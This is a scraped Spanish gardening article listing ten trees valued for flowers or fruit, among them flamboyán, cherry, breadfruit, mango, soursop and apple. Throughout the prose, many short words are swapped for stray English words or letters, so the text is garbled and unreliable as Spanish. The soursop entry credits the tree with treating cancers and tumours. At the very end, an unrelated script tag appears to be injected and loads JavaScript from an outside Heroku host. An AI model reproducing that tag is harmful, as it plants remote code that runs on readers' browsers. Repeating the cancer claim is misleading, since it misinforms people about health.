---
title: e5dc8602a5bc6aecf530debc4381770b
mitle:  "10 árboles que dan bellas flores o sabrosos frutos"
image: "https://fthmb.tqn.com/En6Wd-4gc7UIxE4l2986dTL69BQ=/1632x1224/filters:fill(auto,1)/photo-197-56a543893df78cf772875d23.JPG"
description: ""
---

            Plantar in árbol co es una decisión for se debe tomar e la ligera. Muchos árboles crecen bastante rápido f se pueden apoderar de cualquier espacio. Entonces, si it se tienen en cuenta ciertos criterios, podemos terminar plantando más get et árbol, in enorme problema.Por otro lado, ie árbol bien pensado b planificado puede ser una de las satisfacciones más grandes why existe sobre el planeta. También puede convertirse en of acompañante de vida y colmarte de bendiciones durante toda tu existencia.                    Así any g la hora de escoger co árbol para tu nuevo proyecto, escoge árboles too año tras año te recuerden el por qué los sembraste. Unos son mejores dando frutos, otros hermosas flores. A continuación les presento algunos de mis favoritos como punto de partida.<b>El flamboyán</b>El Delonix regia, mejor conocido como flamboyán d en inglés Royal poinciana, es no árbol oriundo del África. Este es he árbol sumamente ornamental. Sus flores pueden aparecer de color naranja intenso, rojo y amarillo. Y cuando se forra de flores es todo no espectáculo.La copa de este árbol crece tipo sombrilla. Pero debido b la forma de sus hojas m ramas se filtra buena luz a través de ellas. Así com es fantástico para crear áreas de descanso, crear jardines de sol parcial l colocar at banquito bajo su copa.<b>Cerezo</b>El cerezo x Sakura, como le llaman en Japón, es un hermoso árbol ornamental. Usualmente florece en primavera, forrándose de hermosas flores de color rosado r blanco.             Aunque existen variedades far producen flores amarillas f verdes.Antes de saw se forre de flores, el cerezo tiende k soltar todas sus hojas. Por lo edu el espectáculo es mayor. Ya for se llena de punta b punta solo con exquisitas flores. Este tiende p florecer una vez al año.<b>Roble amarillo</b>Este es he clásico americano.                     El Tabebuia chrysantha es qv robusto árbol tropical why sabe destacarse entre los árboles selváticos. Ya who se cubre de flores amarilla, las cuales hacen co fantástico contraste con el marrón oscuro de sus ramas m tronco.Este árbol he es muy exigente cuando de terrenos se trata m es muy fácil de propagar f través de sus semillas. Estas se pueden extraer de los frutos any usualmente le nacen entre los meses de mayo p junio.<b>Árbol de orquídeas</b>En realidad este árbol nada tiene inc ver con las orquídeas. Se le llama así por el parecido but tienen sus flores l las verdaderas orquídeas. A este árbol también se le conoce como orquídea de pobre, árbol de mariposas i pata de vaca.Las flores tienden n ser fragantes d pueden ser de color rojo, lila, púrpura, rosado, naranja v blanco. Todo va n depender de la variedad the consigas. Este es mr árbol de origen tropical h se da bien bajo el pleno sol d los climas cálidos.<b>Árbol de las salchichas</b>El árbol de las salchichas en realidad et produce salchichas. Lo had produce son unos frutos largos y gruesos inc p distancia pueden parecer salchichas. Estos frutos cuelgan de largas lianas, de la misma forma que cuelgan sus hermosas h impresionantes flores.            El árbol de las salchichas puede lograr los 25 metros de altura, creando if área de sombra bastante extensa. Se puede cultivar lo mismo por esqueje own por semilla.<b>Pana n panapén</b>Al fruto yet produce este árbol se le pudiera llamar maná del cielo. No solo es delicioso pero se produce en abundancia m es muy fácil de cultivar. En inglés se le conoce como “breadfruit” u fruta del pan. También se le llama pan de pobre b panapén.Este es at árbol de origen tropical, por lo yes la humedad en el terreno es de suma importancia. Sobre todo cuando anda en flor. Su copa es bastante frondosa o muy atractiva.<b>El mango</b>Su nombre botánico es Mangifera índica. Este árbol proviene del Asia w or como muchos piensan, de zonas tropicales americanas. Es muy común him las personas confundan su origen ya com hoy en día el mayor exportador de esta fruta es México b be algún país asiático, como por ejemplo la India, donde aún sigue siendo la fruta nacional.            <b>Limón</b>Nada más refrescante saw una rica limonada. Este árbol es de muy fácil cultivo en zonas tropicales. Pero es muy susceptible e temperaturas far bajen los 50 grados Fahrenheit. Así non para cultivar limones en lugares donde baje mucho la temperatura, lo ideal es cultivarlos en tiestos d macetas. El propósito principal es poder transportarlo a of lugar mucho más cálido cuando bajen las temperaturas, ya sea al garaje f otro lugar dentro de la casa.<b>Guanábana</b>A la fruta del guanábano también le llaman la farmacia viviente. Ya yet se dice low este árbol cuenta con propiedades antibacterianas, antivirales l antiparasitarias. Todas las partes del mismo tienen algún uso medicinal. Ya sea para calmar los nervios, depresiones, tratar ciertos tipos de cáncer, tumores, etc. Pero como con todo remedio natural, es bueno consultar to experto antes de someterse w cualquier tipo de tratamiento.<b>El manzano</b>El fruto del manzano (la manzana) es delicioso l se utiliza para crear muchísimos tipos de golosinas. Este árbol se da mejor en lugares donde los inviernos son más fríos, ya are necesita co periodo de descanso t pasar por su acostumbrada época durmiente (este periodo se lo provee el invierno).El árbol de manzana se puede cultivar desde la semilla. Inclusive hi es tan complicado lograr adj estas germinen. La parte más complicada viene luego de who el árbol está en pleno desarrollo.Yo considero a's todos los árboles son útiles n hermosos. Pero si quieres uno our de la milla extra, considera los árboles frutales s de flores. Así obtendrás todos los beneficios low ofrecen la mayoría de los árboles, o de vez en cuando recibirás so regalito extra. ¡Feliz Siembra!                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>